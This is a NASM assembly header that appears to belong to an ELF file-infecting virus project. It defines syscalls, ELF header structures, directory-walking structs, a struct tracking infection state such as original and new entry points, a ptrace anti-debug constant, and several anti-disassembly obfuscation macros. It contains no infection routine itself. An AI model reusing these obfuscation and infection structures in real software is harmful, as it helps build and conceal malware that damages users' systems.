; syscall
%define READ 0
%define WRITE 1
%define OPEN 2
%define CLOSE 3
%define LSEEK 8
%define MMAP 9
%define MUNMAP 11
%define EXIT 60
%define GETDENTS 78
%define GETTIMEOFDAY 96
%define PTRACE 101

; read
%define O_RDONLY 0

; write
%define STDOUT 1

; open
%define OPEN_FLAG 0o1001
%define OPEN_MODE 0o755
%define OPEN_DIRECTORY 65536

; lseek
%define SEEK_END 2

; mmap
%define PROT_READ 0x1
%define PROT_WRITE 0x2
%define MAP_PRIVATE 0x2

; ptrace
%define PTRACE_TRACEME 0x0

%define PAYLOAD_SIZE _end - _start

%define KEY_LEN 16

%define BASE_HEX 16

%define READ_BUF 256

%define S_WAR_SIZE 92
struc s_war
	.fd					resd 1
	.filename			resq 1
	.ptr				resq 1
	.ptr_len			resq 1
	.old_ptr_len		resq 1
	.load_phdr			resq 1
	.data_shdr			resq 1
	.bss_size			resq 1
	.added_size			resq 1
	.old_entry			resq 1
	.new_entry			resq 1
	.offset_code		resq 1
endstruc


%define PATH_MAX 4096
%define DT_DIR 4
%define DT_REG 8
%define DIRENT_BUF 1024
struc linux_dirent
	.d_ino			resq 1
	.d_off			resq 1
	.d_reclen		resw 1
	.d_name			resb 1
endstruc


%define TIMEVAL_SIZE 16
struc timeval
	.tv_sec			resq 1
	.tv_usec		resq 1
endstruc


%define EHDR_SIZE 64
struc ehdr
	.ei_mag			resd 1
	.ei_class		resb 1
	.ei_data		resb 1
	.ei_version		resb 1
	.ei_pad			resb 9
	.e_type			resw 1
	.e_machine		resw 1
	.e_version		resd 1
	.e_entry		resq 1
	.e_phoff		resq 1
	.e_shoff		resq 1
	.e_flags		resd 1
	.e_ehsize		resw 1
	.e_phentsize	resw 1
	.e_phnum		resw 1
	.e_shentsize	resw 1
	.e_shnum		resw 1
	.e_shstrndx		resw 1
endstruc


%define ELFMAG 0x464c457f
%define ELFCLASS64 2
%define EI_DATA 0
%define EV_CURRENT 1
%define ET_EXEC 2
%define ET_DYN 3

%define SHDR_SIZE 64
struc shdr
	.sh_name		resd 1
	.sh_type		resd 1
	.sh_flags		resq 1
	.sh_addr		resq 1
	.sh_offset		resq 1
	.sh_size		resq 1
	.sh_link		resd 1
	.sh_info		resd 1
	.sh_addralign	resq 1
	.sh_entsize		resq 1
endstruc


%define P_LOAD 1
%define PF_RWX 0x7

%define PHDR_SIZE 56
struc phdr
	.p_type		resd 1
	.p_flags	resd 1
	.p_offset	resq 1
	.p_vaddr	resq 1
	.p_paddr	resq 1
	.p_filesz	resq 1
	.p_memsz	resq 1
	.p_align	resq 1
endstruc


%macro PUSHAQ 0
	pushfq
	push rax
	push rcx
	push rdx
	push rbx
	push rsp
	push rbp
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
%endmacro

%macro POPAQ 0
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbp
	pop rsp
	pop rbx
	pop rdx
	pop rcx
	pop rax
	popfq
%endmacro

%macro ENTER 1
	push rbp
	mov rbp, rsp
	sub rsp, %1
%endmacro

%macro ENTER_OBF 1
	sub rsp, 8
	mov QWORD[rsp], rbp
	shl rsp, 2
	xchg rsp, rbp
	shr rbp, 1
	mov rsp, rbp
	shr rbp, 1
	shr rsp, 1
	sub rsp, %1
%endmacro

%macro OBF1 1
	db 0xeb			; jmp
	db 0x01
	db %1			; 0xcf,  0x0f,  random
%endmacro

%macro OBF2 1
	push rax
	xor rax, rax
	db 0x74			; je
	db 0x01
	db %1
	pop rax
%endmacro

%macro OBF3 0
	push r9
	push rbp
	MOV_OBF1 rbp, 0x14
	lea r9, [rel $-7]
	add rbp, r9
	jmp rbp
	db 0x0f
	pop r9
	pop rbp
	xchg r9, rbp
%endmacro

; mov %1, %2  |  %1 = reg;  %2 = nb
%macro MOV_OBF1 2
	sub rsp, 8
	mov QWORD[rsp], %2 - 9
	pop %1
	add %1, 8
	inc %1
%endmacro

; mov %1, %2  |  %1 = reg;  %2 = reg
%macro MOV_OBF2 2
	xor %1, %2
	xor %2, %1
	xor %1, %2
	mov %2, %1
%endmacro

%macro OBF_USELESS 1
	push rdx
	push rcx
	shl rsp, 8
	add rax, 4
	mov rdx, 3
	mul rdx
	shr rsp, 5
	sub rax, 12
	mov rcx, 3
	OBF1 %1
	div rcx
	shr rsp, 3
	pop rdx
	pop rcx
	xchg rcx, rdx
%endmacro
